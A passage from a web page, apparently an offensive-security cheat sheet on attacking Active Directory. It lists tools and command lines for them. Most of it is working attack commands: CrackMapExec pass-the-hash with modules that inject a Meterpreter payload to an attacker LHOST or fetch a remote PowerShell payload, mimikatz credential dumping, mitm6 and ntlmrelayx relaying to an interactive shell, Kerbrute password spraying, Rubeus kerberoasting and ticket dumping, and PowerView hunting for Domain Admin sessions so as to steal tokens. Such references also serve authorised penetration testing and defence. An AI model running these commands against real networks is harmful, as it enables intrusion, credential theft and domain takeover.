            <li><a href="#active-directory-groupsactive-directory-groups"><a href="#active-directory-groups">Active Directory Groups</a></a></li>
            <li><a href="#abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</a></li>
            <li><a href="#dcom-exploitation">DCOM Exploitation</a></li>
            <li><a href="#trust-relationship-between-domains">Trust relationship between domains</a></li>
            <li><a href="#child-domain-to-forest-compromise---sid-hijacking">Child Domain to Forest Compromise - SID Hijacking</a></li>
            <li><a href="#forest-to-forest-compromise---trust-ticket">Forest to Forest Compromise - Trust Ticket</a></li>
            <li><a href="#privileged-access-management-pam-trust">Privileged Access Management (PAM) Trust</a></li>
            <li><a href="#kerberos-unconstrained-delegation">Kerberos Unconstrained Delegation</a></li>
            <li><a href="#kerberos-constrained-delegation">Kerberos Constrained Delegation</a></li>
            <li><a href="#kerberos-resource-based-constrained-delegation">Kerberos Resource Based Constrained Delegation</a></li>
            <li><a href="#kerberos-bronze-bit-attack---cve-2020-17049">Kerberos Bronze Bit Attack - CVE-2020-17049</a></li>
            <li><a href="#privexchange-attack">PrivExchange attack</a></li>
            <li><a href="#sccm-deployment">SCCM Deployment</a></li>
            <li><a href="#sccm-network-access-accounts">SCCM Network Access Accounts</a></li>
            <li><a href="#wsus-deployment">WSUS Deployment</a></li>
            <li><a href="#rodc---read-only-domain-controller-compromise">RODC - Read Only Domain Controller Compromise</a></li>
            <li><a href="#pxe-boot-image-attack">PXE Boot image attack</a></li>
            <li><a href="#dns-reconnaissance">DNS Reconnaissance</a></li>
            <li><a href="#dsrm-credentials">DSRM Credentials</a></li>
            <li><a href="#impersonating-office-365-users-on-azure-ad-connect">Impersonating Office 365 Users on Azure AD Connect</a></li>
          </ul>
        </li>
        <li><a href="#linux-active-directory">Linux Active Directory</a>
          <ul>
            <li><a href="#ccache-ticket-reuse-from-tmp">CCACHE ticket reuse from /tmp</a></li>
            <li><a href="#ccache-ticket-reuse-from-keyring">CCACHE ticket reuse from keyring</a></li>
            <li><a href="#ccache-ticket-reuse-from-sssd-kcm">CCACHE ticket reuse from SSSD KCM</a></li>
            <li><a href="#ccache-ticket-reuse-from-keytab">CCACHE ticket reuse from keytab</a></li>
            <li><a href="#extract-accounts-from-etckrb5keytab">Extract accounts from /etc/krb5.keytab</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="active-directory-attacks">
  Active Directory Attacks
  <a class="anchor" href="#active-directory-attacks">#</a>
</h1>
<h2 id="tools">
  Tools
  <a class="anchor" href="#tools">#</a>
</h2>
<ul>
<li>
<p><a href="https://github.com/CoreSecurity/impacket">Impacket</a> or the <a href="https://github.com/maaaaz/impacket-examples-windows">Windows version</a></p>
</li>
<li>
<p><a href="https://github.com/lgandx/Responder">Responder</a></p>
</li>
<li>
<p><a href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a></p>
</li>
<li>
<p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p>
</li>
<li>
<p><a href="https://github.com/funkandwagnalls/ranger">Ranger</a></p>
</li>
<li>
<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">AdExplorer</a></p>
</li>
<li>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># use the latest release, CME is now a binary packaged will all its dependencies</span>
</span></span><span style="display:flex;"><span>root@payload$ wget https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># execute cme (smb, winrm, mssql, ...)</span>
</span></span><span style="display:flex;"><span>root@payload$ cme smb -L
</span></span><span style="display:flex;"><span>root@payload$ cme smb -M name_module -o VAR=DATA
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#39;:5858d47a41e40b40f294b3100bea611f&#39;</span> -d <span style="color:#e6db74">&#39;DOMAIN&#39;</span> -M invoke_sessiongopher
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=<span style="color:#ae81ff">192.168</span>.1.63 LPORT=<span style="color:#ae81ff">4443</span>
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> -M web_delivery -o URL=<span style="color:#e6db74">&#34;https://IP:PORT/posh-payload&#34;</span>
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">192.168</span>.1.100 -u Administrator -H <span style="color:#e6db74">&#34;:5858d47a41e40b40f294b3100bea611f&#34;</span> --exec-method smbexec -X <span style="color:#e6db74">&#39;whoami&#39;</span>
</span></span><span style="display:flex;"><span>root@payload$ cme smb <span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">24</span> -u user -p <span style="color:#e6db74">&#39;Password&#39;</span> --local-auth -M mimikatz
</span></span><span style="display:flex;"><span>root@payload$ cme mimikatz --server http --server-port <span style="color:#ae81ff">80</span>
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/fox-it/mitm6.git">Mitm6</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/fox-it/mitm6.git <span style="color:#f92672">&amp;&amp;</span> cd mitm6
</span></span><span style="display:flex;"><span>pip install .
</span></span><span style="display:flex;"><span>mitm6 -d lab.local
</span></span><span style="display:flex;"><span>ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -wh: Server hosting WPAD file (Attacker’s IP)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -t: Target (You cannot relay credentials to the same device that you’re spoofing)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -i: open an interactive shell</span>
</span></span><span style="display:flex;"><span>ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/hausec/ADAPE-Script">Active Directory Assessment and Privilege Escalation Script</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/vletoux/pingcastle">Ping Castle</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>pingcastle.exe --healthcheck --server &lt;DOMAIN_CONTROLLER_IP&gt; --user &lt;USERNAME&gt; --password &lt;PASSWORD&gt; --advanced-live --nullsession
</span></span><span style="display:flex;"><span>pingcastle.exe --healthcheck --server domain.local
</span></span><span style="display:flex;"><span>pingcastle.exe --graph --server domain.local
</span></span><span style="display:flex;"><span>pingcastle.exe --scanner scanner_name --server domain.local
</span></span><span style="display:flex;"><span>available scanners are<span style="color:#960050;background-color:#1e0010">:</span>aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/ropnop/kerbrute">Kerbrute</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./kerbrute passwordspray -d &lt;DOMAIN&gt; &lt;USERS.TXT&gt; &lt;PASSWORD&gt;
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>USER &lt;/password<span style="color:#960050;background-color:#1e0010">:</span>PASSWORD [/enctype<span style="color:#960050;background-color:#1e0010">:</span>DES|RC4|AES128|AES256] | /des<span style="color:#960050;background-color:#1e0010">:</span>HASH | /rc4<span style="color:#960050;background-color:#1e0010">:</span>HASH | /aes128<span style="color:#960050;background-color:#1e0010">:</span>HASH | /aes256<span style="color:#960050;background-color:#1e0010">:</span>HASH&gt; [/domain<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN] [/dc<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN_CONTROLLER] [/ptt] [/luid]
</span></span><span style="display:flex;"><span>Rubeus.exe dump [/service<span style="color:#960050;background-color:#1e0010">:</span>SERVICE] [/luid<span style="color:#960050;background-color:#1e0010">:</span>LOGINID]
</span></span><span style="display:flex;"><span>Rubeus.exe klist [/luid<span style="color:#960050;background-color:#1e0010">:</span>LOGINID]
</span></span><span style="display:flex;"><span>Rubeus.exe kerberoast [/spn<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;blah/blah&#34;</span>] [/user<span style="color:#960050;background-color:#1e0010">:</span>USER] [/domain<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN] [/dc<span style="color:#960050;background-color:#1e0010">:</span>DOMAIN_CONTROLLER] [/ou<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;OU=,...&#34;</span>]
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/AutomatedLab/AutomatedLab">AutomatedLab</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
</span></span><span style="display:flex;"><span>Add-LabMachineDefinition -Name FirstServer -OperatingSystem <span style="color:#e6db74">&#39;Windows Server 2016 SERVERSTANDARD&#39;</span>
</span></span><span style="display:flex;"><span>Install-Lab
</span></span><span style="display:flex;"><span>Show-LabDeploymentSummary
</span></span></code></pre></div></li>
</ul>
<h2 id="active-directory-recon">
  Active Directory Recon
  <a class="anchor" href="#active-directory-recon">#</a>
</h2>
<h3 id="using-bloodhound">
  Using BloodHound
  <a class="anchor" href="#using-bloodhound">#</a>
</h3>
<p>Use the correct collector</p>
<ul>
<li>
<p>AzureHound for Azure Active Directory</p>
</li>
<li>
<p>SharpHound for local Active Directory</p>
</li>
<li>
<p>use <a href="https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350">AzureHound</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># require: Install-Module -name Az -AllowClobber</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># require: Install-Module -name AzureADPreview -AllowClobber</span>
</span></span><span style="display:flex;"><span>Connect-AzureAD
</span></span><span style="display:flex;"><span>Connect-AzAccount
</span></span><span style="display:flex;"><span>. .\AzureHound.ps1
</span></span><span style="display:flex;"><span>Invoke-AzureHound
</span></span></code></pre></div></li>
<li>
<p>use <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># run the collector on the machine using SharpHound.exe</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe</span>
</span></span><span style="display:flex;"><span>.\SharpHound.exe -c all -d active.htb --searchforest
</span></span><span style="display:flex;"><span>.\SharpHound.exe -c all,GPOLocalGroup <span style="color:#75715e"># all collection doesn&#39;t include GPOLocalGroup by default</span>
</span></span><span style="display:flex;"><span>.\SharpHound.exe --CollectionMethod DCOnly <span style="color:#75715e"># only collect from the DC, doesn&#39;t query the computers (more stealthy)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;
</span></span><span style="display:flex;"><span>.\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domaincontroller <span style="color:#ae81ff">10.10</span>.10.100 -d active.htb
</span></span><span style="display:flex;"><span>.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle <span style="color:#ae81ff">10000</span> --jitter <span style="color:#ae81ff">23</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or run the collector on the machine using Powershell</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1</span>
</span></span><span style="display:flex;"><span>Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
</span></span><span style="display:flex;"><span>Invoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or remotely via BloodHound Python</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/fox-it/BloodHound.py</span>
</span></span><span style="display:flex;"><span>pip install bloodhound
</span></span><span style="display:flex;"><span>bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
</span></span></code></pre></div></li>
<li>
<p>Collect more data for certificates exploitation using Certipy</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy find <span style="color:#e6db74">&#39;corp.local/john:Passw0rd@dc.corp.local&#39;</span> -bloodhound
</span></span><span style="display:flex;"><span>certipy find <span style="color:#e6db74">&#39;corp.local/john:Passw0rd@dc.corp.local&#39;</span> -old-bloodhound
</span></span><span style="display:flex;"><span>certipy find <span style="color:#e6db74">&#39;corp.local/john:Passw0rd@dc.corp.local&#39;</span> -vulnerable -hide-admins -username user@domain -password Password123
</span></span></code></pre></div></li>
</ul>
<p>Then import the zip/json files into the Neo4J database and query them.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@payload$ apt install bloodhound 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># start BloodHound and the database</span>
</span></span><span style="display:flex;"><span>root@payload$ neo4j console
</span></span><span style="display:flex;"><span><span style="color:#75715e"># or use docker</span>
</span></span><span style="display:flex;"><span>root@payload$ docker run -p7474:<span style="color:#ae81ff">7474</span> -p7687:<span style="color:#ae81ff">7687</span> -e NEO4J_AUTH=neo4j/bloodhound neo4j
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@payload$ ./bloodhound --no-sandbox
</span></span><span style="display:flex;"><span>Go to http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">7474</span>, use db<span style="color:#960050;background-color:#1e0010">:</span>bolt<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">7687</span>, user<span style="color:#960050;background-color:#1e0010">:</span>neo4J, pass<span style="color:#960050;background-color:#1e0010">:</span>neo4j
</span></span></code></pre></div><p>You can add some custom queries like :</p>
<ul>
<li><a href="https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json">Bloodhound-Custom-Queries from @hausec</a></li>
<li><a href="https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json">BloodHoundQueries from CompassSecurity</a></li>
<li><a href="https://raw.githubusercontent.com/ShutdownRepo/Exegol/master/sources/bloodhound/customqueries.json">BloodHound Custom Queries from Exegol - @ShutdownRepo</a></li>
<li><a href="https://github.com/ly4k/Certipy/blob/main/customqueries.json">Certipy BloodHound Custom Queries from ly4k</a></li>
</ul>
<p>Replace the customqueries.json file located at <code>/home/username/.config/bloodhound/customqueries.json</code> or <code>C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json</code>.</p>
<h3 id="using-powerview">
  Using PowerView
  <a class="anchor" href="#using-powerview">#</a>
</h3>
<ul>
<li>
<p><strong>Get Current Domain:</strong> <code>Get-NetDomain</code></p>
</li>
<li>
<p><strong>Enum Other Domains:</strong> <code>Get-NetDomain -Domain &lt;DomainName&gt;</code></p>
</li>
<li>
<p><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></p>
</li>
<li>
<p><strong>Get Domain Policy:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainPolicy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Will show us the policy configurations of the Domain about system access or kerberos</span>
</span></span><span style="display:flex;"><span>(Get-DomainPolicy).<span style="color:#e6db74">&#34;system access&#34;</span>
</span></span><span style="display:flex;"><span>(Get-DomainPolicy).<span style="color:#e6db74">&#34;kerberos policy&#34;</span>
</span></span></code></pre></div></li>
<li>
<p><strong>Get Domain Controlers:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetDomainController
</span></span><span style="display:flex;"><span>Get-NetDomainController -Domain &lt;DomainName&gt;
</span></span></code></pre></div></li>
<li>
<p><strong>Enumerate Domain Users:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetUser
</span></span><span style="display:flex;"><span>Get-NetUser -SamAccountName &lt;user&gt; 
</span></span><span style="display:flex;"><span>Get-NetUser | select cn
</span></span><span style="display:flex;"><span>Get-UserProperty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Check last password change</span>
</span></span><span style="display:flex;"><span>Get-UserProperty -Properties pwdlastset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Get a spesific &#34;string&#34; on a user&#39;s attribute</span>
</span></span><span style="display:flex;"><span>Find-UserField -SearchField Description -SearchTerm <span style="color:#e6db74">&#34;wtver&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate user logged on a machine</span>
</span></span><span style="display:flex;"><span>Get-NetLoggedon -ComputerName &lt;ComputerName&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate Session Information for a machine</span>
</span></span><span style="display:flex;"><span>Get-NetSession -ComputerName &lt;ComputerName&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate domain machines of the current/specified domain where specific users are logged into</span>
</span></span><span style="display:flex;"><span>Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Domain Computers:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetComputer -FullData
</span></span><span style="display:flex;"><span>Get-DomainGroup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate Live machines </span>
</span></span><span style="display:flex;"><span>Get-NetComputer -Ping
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Groups and Group Members:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetGroupMember -GroupName <span style="color:#e6db74">&#34;&lt;GroupName&gt;&#34;</span> -Domain &lt;DomainName&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate the members of a specified group of the domain</span>
</span></span><span style="display:flex;"><span>Get-DomainGroup -Identity &lt;GroupName&gt; | Select-Object -ExpandProperty Member
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences</span>
</span></span><span style="display:flex;"><span>Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
</span></span></code></pre></div></li>
<li>
<p><strong>Enumerate Shares</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#Enumerate Domain Shares</span>
</span></span><span style="display:flex;"><span>Find-DomainShare
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate Domain Shares the current user has access</span>
</span></span><span style="display:flex;"><span>Find-DomainShare -CheckShareAccess
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Group Policies:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetGPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Shows active Policy on specified machine</span>
</span></span><span style="display:flex;"><span>Get-NetGPO -ComputerName &lt;Name of the PC&gt;
</span></span><span style="display:flex;"><span>Get-NetGPOGroup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Get users that are part of a Machine&#39;s local Admin group</span>
</span></span><span style="display:flex;"><span>Find-GPOComputerAdmin -ComputerName &lt;ComputerName&gt;
</span></span></code></pre></div></li>
<li>
<p><strong>Enum OUs:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetOU -FullData 
</span></span><span style="display:flex;"><span>Get-NetGPO -GPOname &lt;The GUID of the GPO&gt;
</span></span></code></pre></div></li>
<li>
<p><strong>Enum ACLs:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Returns the ACLs associated with the specified account</span>
</span></span><span style="display:flex;"><span>Get-ObjectAcl -SamAccountName &lt;AccountName&gt; -ResolveGUIDs
</span></span><span style="display:flex;"><span>Get-ObjectAcl -ADSprefix <span style="color:#e6db74">&#39;CN=Administrator, CN=Users&#39;</span> -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Search for interesting ACEs</span>
</span></span><span style="display:flex;"><span>Invoke-ACLScanner -ResolveGUIDs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Check the ACLs associated with a specified path (e.g smb share)</span>
</span></span><span style="display:flex;"><span>Get-PathAcl -Path <span style="color:#e6db74">&#34;\\Path\Of\A\Share&#34;</span>
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Domain Trust:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetDomainTrust
</span></span><span style="display:flex;"><span>Get-NetDomainTrust -Domain &lt;DomainName&gt;
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Forest Trust:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-NetForestDomain
</span></span><span style="display:flex;"><span>Get-NetForestDomain Forest &lt;ForestName&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Domains of Forest Enumeration</span>
</span></span><span style="display:flex;"><span>Get-NetForestDomain
</span></span><span style="display:flex;"><span>Get-NetForestDomain Forest &lt;ForestName&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Map the Trust of the Forest</span>
</span></span><span style="display:flex;"><span>Get-NetForestTrust
</span></span><span style="display:flex;"><span>Get-NetDomainTrust -Forest &lt;ForestName&gt;
</span></span></code></pre></div></li>
<li>
<p><strong>User Hunting:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#Finds all machines on the current domain where the current user has local admin access</span>
</span></span><span style="display:flex;"><span>Find-LocalAdminAccess -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Find local admins on all machines of the domain:</span>
</span></span><span style="display:flex;"><span>Invoke-EnumerateLocalAdmin -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Find computers were a Domain Admin OR a specified user has a session</span>
</span></span><span style="display:flex;"><span>Invoke-UserHunter
</span></span><span style="display:flex;"><span>Invoke-UserHunter -GroupName <span style="color:#e6db74">&#34;RDPUsers&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-UserHunter -Stealth
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Confirming admin access:</span>
</span></span><span style="display:flex;"><span>Invoke-UserHunter -CheckAccess
</span></span></code></pre></div><p>:heavy_exclamation_mark: <strong>Priv Esc to Domain Admin with User Hunting:</strong> <br>
I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt;<br>
Profit!</p>
<p><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView 3.0 Tricks</a></p>
</li>
</ul>
<h3 id="using-ad-module">
  Using AD Module
  <a class="anchor" href="#using-ad-module">#</a>
</h3>
<ul>
<li>
<p><strong>Get Current Domain:</strong> <code>Get-ADDomain</code></p>
</li>
<li>
<p><strong>Enum Other Domains:</strong> <code>Get-ADDomain -Identity &lt;Domain&gt;</code></p>
</li>
<li>
<p><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></p>
</li>
<li>
<p><strong>Get Domain Controlers:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADDomainController
</span></span><span style="display:flex;"><span>Get-ADDomainController -Identity &lt;DomainName&gt;
</span></span></code></pre></div></li>
<li>
